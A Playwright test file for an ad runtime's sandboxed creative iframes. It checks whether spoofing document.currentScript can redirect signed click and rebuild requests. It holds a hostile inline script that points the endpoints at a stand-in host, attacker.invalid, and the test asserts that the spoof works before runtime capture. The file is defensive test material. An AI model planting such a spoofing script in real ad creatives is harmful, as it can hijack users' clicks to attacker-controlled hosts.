import { test, expect } from "@playwright/test";
import { runtimeUrl } from "../../helpers/state.js";

// Creative iframes are sandboxed WITHOUT `allow-same-origin`, so the creative
// runtime executes in an opaque origin whose `location.href` is `about:srcdoc`.
// jsdom cannot reproduce either condition. In a real browser, clicks skip the
// CORS-doomed POST and navigate a GET rebuild URL. Without pre-capture spoofing,
// that URL uses the absolute runtime script's public origin and follows the
// signed rebuild/click chain. Earlier script can instead spoof that origin.
const CREATIVE_SANDBOX_TOKENS = [
  "allow-forms",
  "allow-popups",
  "allow-popups-to-escape-sandbox",
  "allow-scripts",
  "allow-top-navigation-by-user-activation",
].join(" ");

// The stamp stays immutable, but currentScript is not authenticated. A creative
// script running before runtime capture can redirect endpoints by shadowing it.
// The same attack after capture cannot change the pinned endpoint origin.
const ATTACKER_ORIGIN = "https://attacker.invalid";
const HOSTILE_STAMP_OVERWRITE = `<script>
  try { window.__tsCreativeOrigin = '${ATTACKER_ORIGIN}'; } catch (e) {}
  var fake = document.createElement('script');
  fake.setAttribute('src', '${ATTACKER_ORIGIN}/static/tsjs=x.js');
  Object.defineProperty(document, 'currentScript', {
    configurable: true, get: function () { return fake; },
  });
</script>`;

test.describe("Sandboxed creative iframe", () => {
  for (const [parent, attack] of [
    ["first-party", "before capture"],
    ["first-party", "after capture"],
    ["foreign", "before capture"],
    ["foreign", "after capture"],
  ] as const) {
    test(`currentScript shadowing ${attack} with a ${parent} parent ${attack === "before capture" ? "retargets endpoints despite the stamp" : "cannot move the signed GET rebuild chain"}`, async ({
      page,
    }) => {
      const origin = new URL(runtimeUrl("/")).origin;

      // Mint a genuinely signed click without knowing the proxy secret: the
      // signing endpoint computes its token over `tsurl` plus params, which is
      // exactly what the click endpoint validates, so the same query is valid
      // under either path.
      const landing = runtimeUrl("/health");
      const signResponse = await page.request.post(
        runtimeUrl("/first-party/sign"),
        { data: { url: landing } },
      );
      expect(
        signResponse.ok(),
        "signing endpoint should mint a token for the fixture URL",
      ).toBe(true);
      const signedProxyHref = ((await signResponse.json()) as { href: string })
        .href;
      const signedUrl = new URL(signedProxyHref);
      expect(signedUrl.origin).toBe(origin);
      expect(signedUrl.pathname).toBe("/first-party/proxy");
      signedUrl.pathname = "/first-party/click";
      const signedClick = signedUrl.href;

      await page.goto(runtimeUrl("/"), { waitUntil: "domcontentloaded" });

      // Reuse whichever hashed bundle URL the server injected into the page so
      // this test never has to know the current content hash; fall back to the
      // stable unified path if the fixture page carries no injected script.
      const injectedBundle = await page.evaluate(() => {
        const script = Array.from(
          document.querySelectorAll("script[src]"),
        ).find((element) =>
          (element as HTMLScriptElement).src.includes("/static/tsjs="),
        );
        return script ? (script as HTMLScriptElement).src : null;
      });
      const bundleUrl =
        injectedBundle ?? runtimeUrl("/static/tsjs=tsjs-unified.min.js");

      expect(new URL(bundleUrl).origin).toBe(origin);

      let parentOrigin = origin;
      if (parent === "foreign") {
        const parentUrl = new URL("/", origin);
        parentUrl.hostname = "localhost";
        parentOrigin = parentUrl.origin;
        expect(parentOrigin).not.toBe(origin);
        // Real navigation preserves loopback address-space metadata. A
        // synthetic fulfilled parent blocks the opaque frame's runtime load.
        await page.goto(parentUrl.href, { waitUntil: "domcontentloaded" });
        await page.setContent(
          "<!doctype html><html><head><title>Foreign parent</title></head><body></body></html>",
        );
      }
      expect(await page.evaluate(() => location.origin)).toBe(parentOrigin);

      // Keep spoofed navigation local to the test. We assert its destination,
      // not a response from a real attacker or a successful signed click chain.
      await page.route(`${ATTACKER_ORIGIN}/**`, (route) =>
        route.fulfill({
          status: 200,
          contentType: "text/html",
          body: "spoofed endpoint",
        }),
      );

      // A foreign parent's stamp does not override the runtime script origin.
      // Nor does the stamp authenticate currentScript against earlier markup.
      const creativeDocument = `<!DOCTYPE html>
<html>
  <head>
    <script>
      Object.defineProperty(window, '__tsCreativeOrigin', {
        value: '${parentOrigin}', writable: false, configurable: false, enumerable: false,
      });
    </script>
    ${attack === "before capture" ? HOSTILE_STAMP_OVERWRITE : ""}
  </head>
  <body>
    <script src="${bundleUrl}"></script>
    ${attack === "after capture" ? HOSTILE_STAMP_OVERWRITE : ""}
    <a id="creative-link" href="${signedClick}" data-tsclick="${signedClick}">ad</a>
  </body>
</html>`;

      const rebuildResponse = page.waitForResponse(
        (response) => response.url().includes("/first-party/proxy-rebuild"),
        { timeout: 15_000 },
      );
      const clickResponse =
        attack === "after capture"
          ? page.waitForResponse(
              (response) =>
                response.url().includes("/first-party/click") &&
                response.request().resourceType() === "document",
              { timeout: 15_000 },
            )
          : null;

      await page.evaluate(
        ({ sandbox, html }) => {
          const iframe = document.createElement("iframe");
          iframe.setAttribute("sandbox", sandbox);
          iframe.srcdoc = html;
          iframe.style.width = "300px";
          iframe.style.height = "250px";
          document.body.appendChild(iframe);
        },
        { sandbox: CREATIVE_SANDBOX_TOKENS, html: creativeDocument },
      );

      const frame = page.frameLocator("iframe");
      const link = frame.locator("#creative-link");
      await link.waitFor({ state: "attached", timeout: 10_000 });
      expect(
        await link.evaluate(() => ({
          stamp: (window as { __tsCreativeOrigin?: string }).__tsCreativeOrigin,
          script: document.currentScript?.getAttribute("src"),
          origin: window.origin,
          href: location.href,
        })),
      ).toEqual({
        stamp: parentOrigin,
        script: `${ATTACKER_ORIGIN}/static/tsjs=x.js`,
        origin: "null",
        href: "about:srcdoc",
      });

      // The creative mutates its own click target, the shape the click guard
      // exists to repair.
      await link.evaluate((element, click: string) => {
        element.setAttribute("href", `${click}&bar=2`);
      }, signedClick);

      await link.click({ force: true });

      const rebuild = await rebuildResponse;
      expect(rebuild.request().method()).toBe("GET");
      expect(rebuild.request().resourceType()).toBe("document");
      const rebuildUrl = new URL(rebuild.url());
      expect(rebuildUrl.searchParams.get("tsclick")).toBe(signedClick);
      expect(JSON.parse(rebuildUrl.searchParams.get("add") ?? "{}")).toEqual({
        bar: "2",
      });
      if (attack === "before capture") {
        // The immutable stamp survives, but the spoofed script wins at capture.
        expect(rebuildUrl.origin).toBe(ATTACKER_ORIGIN);
        expect(rebuild.status()).toBe(200);
        return;
      }
      // Only changes after capture are prevented from moving the endpoint.
      expect(rebuildUrl.origin).toBe(origin);
      expect(rebuild.status(), "GET rebuild should redirect").toBe(302);

      const click = await clickResponse!;
      expect(new URL(click.url()).origin).toBe(origin);
      expect(click.status(), "re-signed click should redirect").toBe(302);
      // The rebuilt click carries the mutation the creative added.
      expect(decodeURIComponent(click.url())).toContain("bar=2");
    });
  }
});
